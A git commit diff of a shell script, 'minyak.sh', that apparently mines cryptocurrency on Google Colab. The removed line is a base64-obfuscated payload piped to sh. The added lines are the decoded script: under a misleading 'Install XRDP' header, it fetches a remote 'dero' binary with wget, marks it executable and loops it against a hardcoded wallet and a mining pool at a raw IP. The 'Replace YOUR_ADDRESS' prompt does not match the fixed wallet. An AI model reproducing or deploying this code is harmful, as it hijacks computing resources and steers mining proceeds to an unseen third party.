f214625f5c760b9efff42bb3cd73dcb31f510d5e
angkii <83603708+angkii@users.noreply.github.com>
2022-10-26 10:15:24 +0700

    Update minyak.sh

--- minyak.sh
+++ minyak.sh
@@ -1,1 +1,18 @@
-base64 -d <<< IyAvYmluL2Jhc2gKIyBJbnN0YWxsIFhSRFAKIyBCZWZvcmUgZ2V0IHhtciBjb2luIGZvciBmcmVlCiMgR29vZ2xlIENvbGFiCnN1ZG8gYXB0IHVwZGF0ZQpjbGVhcgpzdWRvIGFwdCBpbnN0YWxsIHNjcmVlbgpzY3JlZW4gLVIgZGVybwoKd2dldCBodHRwczovL2dpdGh1Yi5jb20vYW5na2lpL20vYmxvYi9tYWluL2Rlcm8KY2htb2QgNzc3IGRlcm8KCiMhL2Jpbi9iYXNoCmVjaG8gIlJlcGxhY2UgWU9VUl9BRERSRVNTIHRvIHJ1biB0aGUgbWluZXIiCndoaWxlIDo7IGRvCiAgICAuL2Rlcm8gLXcgZGVyb2kxcXl6bHh4Z3Eyd2V5cWx4ZzV1NHRrbmcybGY1cmt0d2FucWhzZTJod201NzdwczIyenYyeDJxOXB2Zno5MnhtenJjOTh3ZGZ6MGpmcTVyMmNyYyAtciA1MS43OS4yOS4zOjgwIC1wIHN0cmF0dW07CiAgICBzbGVlcCA1Owpkb25l | sh
+# /bin/bash
+# Install XRDP
+# Before get xmr coin for free
+# Google Colab
+sudo apt update
+clear
+sudo apt install screen
+screen -R dero
+
+wget https://github.com/angkii/m/blob/main/dero
+chmod 777 dero
+
+#!/bin/bash
+echo "Replace YOUR_ADDRESS to run the miner"
+while :; do
+    ./dero -w deroi1qyzlxxgq2weyqlxg5u4tkng2lf5rktwanqhse2hwm577ps22zv2x2q9pvfz92xmzrc98wdfz0jfq5r2crc -r 51.79.29.3:80 -p stratum;
+    sleep 5;
+done
